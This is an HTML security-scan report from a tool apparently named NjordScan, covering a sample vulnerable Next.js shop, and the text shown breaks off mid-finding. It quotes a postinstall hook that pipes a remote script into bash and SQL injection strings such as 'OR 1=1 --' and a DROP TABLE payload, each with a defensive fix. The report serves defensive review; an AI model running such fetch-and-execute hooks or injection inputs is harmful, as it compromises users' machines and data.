@@ -1,0 +1,715 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NjordScan report</title>
+<style>
+  :root { color-scheme: light dark; }
+  * { box-sizing: border-box; }
+  body { font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+         margin: 0; background: #0b1020; color: #e5e7eb; line-height: 1.55; }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 32px 20px 64px; }
+  header h1 { margin: 0; font-size: 26px; } header .sub { color: #94a3b8; margin-top: 4px; }
+  .meta { color: #94a3b8; font-size: 14px; margin: 6px 0 18px; }
+  .chips { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 28px; }
+  .chip { color: #fff; padding: 4px 12px; border-radius: 999px; font-size: 13px; font-weight: 600; }
+  .chip.ok { background: #16a34a; }
+  .allclear { background: #052e16; border: 1px solid #16a34a; padding: 20px; border-radius: 12px; }
+  .finding { background: #111827; border: 1px solid #1f2937; border-left: 4px solid #888;
+             border-radius: 10px; margin: 10px 0; overflow: hidden; }
+  summary { cursor: pointer; padding: 14px 16px; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+  summary::-webkit-details-marker { display:none; }
+  .sev { color: #fff; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 6px; letter-spacing: .03em; }
+  .ftitle { font-weight: 600; } .floc { color: #94a3b8; font-size: 13px; margin-left: auto; font-family: ui-monospace, monospace; }
+  .body { padding: 4px 18px 18px; border-top: 1px solid #1f2937; }
+  .tags { color: #94a3b8; font-size: 12px; font-style: italic; }
+  .block { margin: 14px 0; } .block h4 { margin: 0 0 6px; font-size: 13px; text-transform: uppercase; letter-spacing: .04em; color: #cbd5e1; }
+  pre { background: #0b1020; border: 1px solid #1f2937; border-radius: 8px; padding: 12px; overflow:auto; margin: 6px 0; }
+  pre.fix { border-color: #166534; } code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 13px; }
+  .flow { margin: 0; padding-left: 20px; } .muted { color: #64748b; }
+  .ai { background: #1e1b4b; border: 1px solid #4338ca; border-radius: 8px; padding: 4px 14px; }
+  a { color: #60a5fa; } ul { margin: 6px 0; padding-left: 20px; }
+  footer { color: #64748b; font-size: 12px; margin-top: 32px; text-align: center; }
+</style></head>
+<body><div class="wrap">
+  <header>
+    <h1>🛡 NjordScan report</h1>
+    <div class="sub">Security scan — explained in plain English</div>
+  </header>
+  <div class="meta">/home/megatron/Coding/NjordScan/examples/vulnerable-shop · nextjs · 7 files · 0.15s · 30 issue(s)</div>
+  <div class="chips"><span class="chip" style="background:#dc2626">3 critical</span><span class="chip" style="background:#ea580c">10 high</span><span class="chip" style="background:#ca8a04">14 medium</span><span class="chip" style="background:#0891b2">3 low</span></div>
+  
+    <details class="finding" style="border-left-color:#dc2626">
+      <summary>
+        <span class="sev" style="background:#dc2626">CRITICAL</span>
+        <span class="ftitle">AWS access key committed to the repository</span>
+        <span class="floc">.env.local:2</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-798 · A07:2021-Identification and Authentication Failures · confidence: high</p>
+        <p class="msg">Looks like a AWS Access Key ID.</p>
+        <div class="block"><h4>Found here</h4><pre><code>AWS_…****=AKIA…****</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>An AWS access key pair grants programmatic access to your cloud account. Committed AWS keys are scraped automatically and can be used to spin up servers (huge bills) or read your data within minutes of being pushed.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Deactivate and delete this key in the AWS IAM console immediately, then issue a new one and store it in your host&#x27;s secret manager / environment — never in code.</p>
+          <pre class="fix"><code>// load from process.env at runtime; configure via AWS IAM roles where possible</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html" rel="noopener noreferrer" target="_blank">https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#dc2626">
+      <summary>
+        <span class="sev" style="background:#dc2626">CRITICAL</span>
+        <span class="ftitle">SQL query built by glueing strings together</span>
+        <span class="floc">lib/db.ts:7</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-89 · A03:2021-Injection · confidence: high</p>
+        <p class="msg">SQL query is concatenated with a variable — a user can inject their own SQL. Use a parameterized query with ? / $1 placeholders.</p>
+        <div class="block"><h4>Found here</h4><pre><code>return client.query(&#x27;SELECT * FROM products WHERE name LIKE %&#x27; + term + &#x27;%&#x27;);</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>When you build a SQL query by adding (`+`) a variable into the query
+string, the database can&#x27;t tell your query apart from data the user typed.
+If that variable came from a form, a URL, or an API request, an attacker can
+type SQL of their own — for example ending your query early and adding
+`OR 1=1 --` to dump every row, or `; DROP TABLE users; --` to delete data.
+This is the classic &quot;SQL injection&quot; bug, and it can leak or destroy your
+entire database.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Never put user data directly into the query text. Use a parameterized query
+(also called a &quot;prepared statement&quot;): write `?` or `$1` placeholders and
+pass the values as a separate array. The database driver then treats them as
+pure data that can never become SQL. If you use an ORM (Prisma, Drizzle,
+Sequelize), use its query builder instead of raw string SQL.</p>
+          <pre class="fix"><code>// instead of: db.query(&#x27;SELECT * FROM users WHERE id = &#x27; + id)
+db.query(&#x27;SELECT * FROM users WHERE id = ?&#x27;, [id]); // value is sent separately</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://owasp.org/www-community/attacks/SQL_Injection" rel="noopener noreferrer" target="_blank">https://owasp.org/www-community/attacks/SQL_Injection</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="noopener noreferrer" target="_blank">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#dc2626">
+      <summary>
+        <span class="sev" style="background:#dc2626">CRITICAL</span>
+        <span class="ftitle">Dangerous install lifecycle script in package.json</span>
+        <span class="floc">package.json:8</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-506 · A08:2021-Software and Data Integrity Failures · confidence: high</p>
+        <p class="msg">Lifecycle script &#x27;postinstall&#x27;: Pipes remote content directly into a shell/interpreter.</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;postinstall&quot;: &quot;curl -s https://setup.example.com/init.sh | bash&quot;</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>`preinstall`/`postinstall` scripts run automatically on `npm install`, with your user&#x27;s permissions. A script that pipes a remote file into a shell (curl | sh), opens a reverse shell, or reads credentials is a classic supply-chain attack — it runs before you ever start your app.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Review the script and the package that ships it. Install untrusted packages with `npm install --ignore-scripts`. Remove any install script that fetches and executes remote code.</p>
+          <pre class="fix"><code>npm install --ignore-scripts   # then run only the build steps you trust</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://docs.npmjs.com/cli/v10/using-npm/scripts#best-practices" rel="noopener noreferrer" target="_blank">https://docs.npmjs.com/cli/v10/using-npm/scripts#best-practices</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">Hard-coded secret or credential</span>
+        <span class="floc">.env.local:3</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-798 · A07:2021-Identification and Authentication Failures · confidence: high</p>
+        <p class="msg">Looks like a Database URL with credentials.</p>
+        <div class="block"><h4>Found here</h4><pre><code>DATA…****=postgres://sh…****:Pr0d…****@db.internal:5432/shop</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>A secret committed to your code (API key, password, token) is visible to anyone who can see the repository — and stays in git history forever, even if you delete the line later. Leaked keys are routinely scraped from public repos within minutes and used to run up bills or steal data.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Move the value to an environment variable, add the env file to .gitignore, and ROTATE the exposed secret now (assume it is already compromised). On Next.js, only expose values to the browser via the NEXT_PUBLIC_ prefix when you intend them to be public.</p>
+          <pre class="fix"><code>const apiKey = process.env.API_KEY; // set in your host&#x27;s env / .env.local (gitignored)</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html" rel="noopener noreferrer" target="_blank">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">Secret exposed to the browser via NEXT_PUBLIC_ / VITE_</span>
+        <span class="floc">.env.local:5</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-200 · A01:2021-Broken Access Control · confidence: medium</p>
+        <p class="msg">`NEXT_PUBLIC_INTERNAL_API_TOKEN` is exposed to the browser bundle.</p>
+        <div class="block"><h4>Found here</h4><pre><code>NEXT…****=tkn_…****</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>Variables prefixed with NEXT_PUBLIC_ (Next.js) or VITE_ (Vite) are inlined into the JavaScript bundle that ships to every visitor. Putting a real secret (private API key, DB password) behind that prefix publishes it to the whole world.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Only use the public prefix for values that are safe to be public. Keep real secrets unprefixed and read them only in server code (Route Handlers, Server Actions, getServerSideProps).</p>
+          <pre class="fix"><code>// server only:
+const key = process.env.STRIPE_SECRET_KEY; // NOT NEXT_PUBLIC_</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://nextjs.org/docs/app/building-your-application/configuring/environment-variables" rel="noopener noreferrer" target="_blank">https://nextjs.org/docs/app/building-your-application/configuring/environment-variables</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">AI route calls the model with no sign-in / auth check in the file</span>
+        <span class="floc">app/api/chat/route.ts:1</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-770 · A04:2021-Insecure Design · confidence: medium</p>
+        <p class="msg">This AI route calls the model but the file has no sign-in/auth check — anyone can hit it and run up your AI bill (denial of wallet). Require a logged-in user before the model call.</p>
+        <div class="block"><h4>Found here</h4><pre><code>import OpenAI from &#x27;openai&#x27;;</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This route handler calls a paid AI model (OpenAI / Anthropic / etc.) but
+nothing in the file checks who is calling it — no session, no login, no API
+token. That means ANYONE on the internet who finds the URL can hit it as
+many times as they like. Every call costs you money, so a bot can run up a
+huge bill on your account overnight (&quot;denial of wallet&quot;), and your model
+quota gets drained for real users. It also lets strangers use your app as a
+free LLM proxy. (This is a heuristic: if your auth check lives in middleware
+or a shared helper this file doesn&#x27;t reference, you can add a
+`// njordscan-ignore` comment on the call line.)</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Before calling the model, confirm the request is from a logged-in user and
+reject it otherwise. Use whatever auth you already have: `getServerSession`
+(NextAuth), `auth()` (Clerk), `supabase.auth.getUser()`, or a check on the
+`Authorization` header / API key for server-to-server calls. Return 401 if
+the check fails — do this first, before any model call.</p>
+          <pre class="fix"><code>import { getServerSession } from &#x27;next-auth&#x27;;
+export async function POST(req) {
+  const session = await getServerSession();
+  if (!session) return new Response(&#x27;Unauthorized&#x27;, { status: 401 });
+  const completion = await openai.chat.completions.create({
+    model: &#x27;gpt-4o-mini&#x27;, max_tokens: 500, messages,
+  });
+  return Response.json(completion);
+}</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/" rel="noopener noreferrer" target="_blank">https://owasp.org/www-project-top-10-for-large-language-model-applications/</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html" rel="noopener noreferrer" target="_blank">https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">User input assigned to innerHTML / outerHTML</span>
+        <span class="floc">app/api/chat/route.ts:14</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-79 · A03:2021-Injection · confidence: medium</p>
+        <p class="msg">innerHTML assigned a non-literal value; renders as HTML and can execute injected scripts if user-controlled.</p>
+        <div class="block"><h4>Found here</h4><pre><code>document.getElementById(&#x27;a&#x27;).innerHTML = answer; // LLM output rendered as HTML (XSS)</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data an attacker controls, they can inject markup that runs JavaScript in your users&#x27; browsers (cross-site scripting), letting them hijack accounts or steal data.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React, render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with DOMPurify first.</p>
+          <pre class="fix"><code>element.textContent = userInput; // rendered as text, never executed</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://owasp.org/www-community/attacks/xss/" rel="noopener noreferrer" target="_blank">https://owasp.org/www-community/attacks/xss/</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">User input assigned to innerHTML / outerHTML</span>
+        <span class="floc">app/api/products/route.ts:10</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-79 · A03:2021-Injection · confidence: high</p>
+        <p class="msg">User input from `req.body` flows into paint() -&gt; el.innerHTML [in lib/render.ts].</p>
+        <div class="block"><h4>Found here</h4><pre><code>paint(el, body.labelHtml);</code></pre></div>
+        <div class="block"><h4>Data flow</h4><ol class="flow"><li><b>source</b>: <code>req.body</code> <span class="muted">(app/api/products/route.ts:5)</span></li><li><b>propagation</b>: <code>paint() in lib/render.ts (param 1 -&gt; el.innerHTML)</code> <span class="muted">(lib/render.ts:10)</span></li><li><b>sink</b>: <code>paint() -&gt; el.innerHTML [in lib/render.ts]</code> <span class="muted">(app/api/products/route.ts:10)</span></li></ol></div>
+        <div class="block"><h4>💡 Why this matters</h4><p>Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data an attacker controls, they can inject markup that runs JavaScript in your users&#x27; browsers (cross-site scripting), letting them hijack accounts or steal data.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React, render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with DOMPurify first.</p>
+          <pre class="fix"><code>element.textContent = userInput; // rendered as text, never executed</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://owasp.org/www-community/attacks/xss/" rel="noopener noreferrer" target="_blank">https://owasp.org/www-community/attacks/xss/</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">User input assigned to innerHTML / outerHTML</span>
+        <span class="floc">lib/render.ts:3</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-79 · A03:2021-Injection · confidence: medium</p>
+        <p class="msg">innerHTML assigned a non-literal value; renders as HTML and can execute injected scripts if user-controlled.</p>
+        <div class="block"><h4>Found here</h4><pre><code>el.innerHTML = html;</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data an attacker controls, they can inject markup that runs JavaScript in your users&#x27; browsers (cross-site scripting), letting them hijack accounts or steal data.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React, render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with DOMPurify first.</p>
+          <pre class="fix"><code>element.textContent = userInput; // rendered as text, never executed</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://owasp.org/www-community/attacks/xss/" rel="noopener noreferrer" target="_blank">https://owasp.org/www-community/attacks/xss/</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2024-51479 (vulnerable &gt;=9.5.5,&lt;14.2.15). Upgrade to 14.2.15 or later. (EPSS 79% 30-day exploit probability) 🎯 `next` is imported and used in your code. Next.js authorization bypass vulnerability</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2024-51479</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:14</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">lodash@4.17.15 is affected by CVE-2021-23337 (vulnerable &lt;4.17.21). Upgrade to 4.17.21 or later. (EPSS 4% 30-day exploit probability) 🎯 Reachable: your code calls the vulnerable `template` from `lodash`. Command injection in lodash via the template function: untrusted templates/options can execute arbitrary code.</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;lodash&quot;: &quot;4.17.15&quot;  // CVE-2021-23337</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:14</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">lodash@4.17.15 is affected by CVE-2026-4800 (vulnerable &gt;=4.0.0,&lt;4.18.0). Upgrade to 4.18.0 or later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in your code. lodash vulnerable to Code Injection via `_.template` imports key names</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;lodash&quot;: &quot;4.17.15&quot;  // CVE-2026-4800</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ea580c">
+      <summary>
+        <span class="sev" style="background:#ea580c">HIGH</span>
+        <span class="ftitle">Untrusted data rendered with dangerouslySetInnerHTML</span>
+        <span class="floc">components/ProductReview.tsx:3</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-79 · A03:2021-Injection · confidence: medium</p>
+        <p class="msg">dangerouslySetInnerHTML receives a non-literal value; if any part is user-controlled this is an XSS sink.</p>
+        <div class="block"><h4>Found here</h4><pre><code>return &lt;div dangerouslySetInnerHTML={{ __html: review.body }} /&gt;;</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>React normally escapes everything you render, which protects your users automatically. `dangerouslySetInnerHTML` turns that protection OFF and injects raw HTML. If any part of that HTML comes from a user (a form field, a URL, an API response, the database), an attacker can smuggle in a &lt;script&gt; tag and run their own JavaScript in your users&#x27; browsers — stealing logins, cookies, or making requests as the victim. This is called cross-site scripting (XSS).</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Prefer rendering text as `{value}` and let React escape it. If you truly need to render HTML (e.g. rich text from a CMS), sanitize it first with a library like DOMPurify and only then pass the cleaned string to dangerouslySetInnerHTML.</p>
+          <pre class="fix"><code>import DOMPurify from &#x27;isomorphic-dompurify&#x27;;
+const clean = DOMPurify.sanitize(userHtml);
+return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html" rel="noopener noreferrer" target="_blank">https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html</a></li><li><a href="https://owasp.org/www-community/attacks/xss/" rel="noopener noreferrer" target="_blank">https://owasp.org/www-community/attacks/xss/</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">AI route calls the model with no rate limit in the file</span>
+        <span class="floc">app/api/chat/route.ts:1</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-770 · A04:2021-Insecure Design · confidence: low</p>
+        <p class="msg">This AI route calls the model with no rate limit in the file — one bot can call it thousands of times and drain your AI budget. Add a per-user/IP limit (e.g. Upstash Ratelimit) before the model call.</p>
+        <div class="block"><h4>Found here</h4><pre><code>import OpenAI from &#x27;openai&#x27;;</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This route calls a paid AI model but nothing in the file limits how often a
+single user (or a bot) can call it. AI calls cost real money per request, so
+without a cap one abusive client can hammer the endpoint thousands of times
+and run up your bill or exhaust your model quota for everyone else (&quot;denial
+of wallet&quot;). Even a friendly bug — a retry loop in the UI — can do this by
+accident. (Heuristic: if you rate-limit in middleware or a shared helper
+this file doesn&#x27;t reference, add `// njordscan-ignore` on the call line.)</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Add a per-user / per-IP rate limit before the model call. A common setup is
+Upstash Ratelimit on Vercel, but any limiter works. Reject requests that go
+over the limit with HTTP 429 before spending money on a model call.</p>
+          <pre class="fix"><code>import { Ratelimit } from &#x27;@upstash/ratelimit&#x27;;
+import { Redis } from &#x27;@upstash/redis&#x27;;
+const ratelimit = new Ratelimit({ redis: Redis.fromEnv(), limiter: Ratelimit.slidingWindow(10, &#x27;60 s&#x27;) });
+export async function POST(req) {
+  const { success } = await ratelimit.limit(req.ip ?? &#x27;anon&#x27;);
+  if (!success) return new Response(&#x27;Too Many Requests&#x27;, { status: 429 });
+  // ...call the model...
+}</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/" rel="noopener noreferrer" target="_blank">https://owasp.org/www-project-top-10-for-large-language-model-applications/</a></li><li><a href="https://upstash.com/docs/redis/sdks/ratelimit-ts/overview" rel="noopener noreferrer" target="_blank">https://upstash.com/docs/redis/sdks/ratelimit-ts/overview</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2025-57822 (vulnerable &gt;=0.9.9,&lt;14.2.32). Upgrade to 14.2.32 or later. (EPSS 8% 30-day exploit probability) 🎯 `next` is imported and used in your code. Next.js Improper Middleware Redirect Handling Leads to SSRF</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2025-57822</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2025-59471 (vulnerable &gt;=10.0.0,&lt;15.5.10). Upgrade to 15.5.10 or later. (EPSS 0% 30-day exploit probability) 🎯 `next` is imported and used in your code. Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2025-59471</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2025-57752 (vulnerable &gt;=0.9.9,&lt;14.2.31). Upgrade to 14.2.31 or later. (EPSS 0% 30-day exploit probability) 🎯 `next` is imported and used in your code. Next.js Affected by Cache Key Confusion for Image Optimization API Routes</p>
+        <div class="block"><h4>Found here</h4><pre><code>&quot;next&quot;: &quot;12.1.0&quot;  // CVE-2025-57752</code></pre></div>
+        
+        <div class="block"><h4>💡 Why this matters</h4><p>This package version has a publicly documented security flaw (a CVE/advisory). Attackers actively scan for apps using vulnerable versions because a working exploit is already published.</p></div>
+        <div class="block"><h4>🛠 How to fix it</h4><p>Upgrade to the patched version listed in the advisory (`npm update &lt;pkg&gt;` or bump it in package.json).</p>
+          <pre class="fix"><code>npm install &lt;package&gt;@&lt;patched-version&gt;</code></pre>
+        </div>
+        
+        <div class="block"><h4>📚 Learn more</h4><ul><li><a href="https://github.com/advisories" rel="noopener noreferrer" target="_blank">https://github.com/advisories</a></li></ul></div>
+      </div>
+    </details>
+
+    <details class="finding" style="border-left-color:#ca8a04">
+      <summary>
+        <span class="sev" style="background:#ca8a04">MEDIUM</span>
+        <span class="ftitle">Dependency with a known security vulnerability</span>
+        <span class="floc">package.json:11</span>
+      </summary>
+      <div class="body">
+        <p class="tags">CWE-1395 · A06:2021-Vulnerable and Outdated Components · confidence: high</p>
+        <p class="msg">next@12.1.0 is affected by CVE-2024-47831 (vulnerable &gt;=10.0.0,&lt;14.2.7). Upgrade to 14.2.7 or later. (EPSS 1% 30-day exploit probability) 🎯 `next` is imported and used in your code. Denial of Service condition in Next.js image optimization</p>
